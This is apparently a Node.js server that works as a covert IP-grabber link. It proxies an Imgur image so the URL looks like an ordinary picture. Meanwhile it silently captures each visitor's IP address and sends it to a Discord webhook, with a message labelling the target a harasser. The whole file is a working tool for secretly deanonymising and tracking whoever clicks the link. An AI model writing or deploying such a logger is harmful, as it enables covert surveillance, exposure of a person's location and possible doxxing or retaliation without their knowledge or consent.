const http = require('http');
const https = require('https');
const { WebhookClient } = require('discord.js');
const url = require('url');
require('dotenv').config();

// 創建 Webhook 客戶端
const webhookClient = new WebhookClient({
  id: process.env.webhookID,
  token: process.env.webhookToken
});

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url);
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // 發送消息
  webhookClient.send(`這位騷擾系噁男的 ipv4 地址是： ${clientIp}`)
    .then(() => console.log('Message sent!'))
    .catch(console.error);

  // Extract the Imgur ID from the path
  const pathParts = parsedUrl.pathname.split('/').filter(Boolean);
  if (pathParts.length > 0) {
    const imgurId = pathParts[pathParts.length - 1];
    const imgurUrl = `https://i.imgur.com/${imgurId}.jpg`;

    https.get(imgurUrl, (imgurRes) => {
      // Check if the image was found on Imgur
      if (imgurRes.statusCode === 200) {
        // Set the appropriate content type
        res.writeHead(200, { 'Content-Type': imgurRes.headers['content-type'] });

        // Pipe the Imgur response to our response
        imgurRes.pipe(res);
      } else {
        // If the image was not found on Imgur, return a 404
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Image not found');
      }
    }).on('error', (e) => {
      console.error(`Error fetching image from Imgur: ${e.message}`);
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Internal Server Error');
    });
  } else {
    // If the path doesn't match the expected format, return a 404
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = server;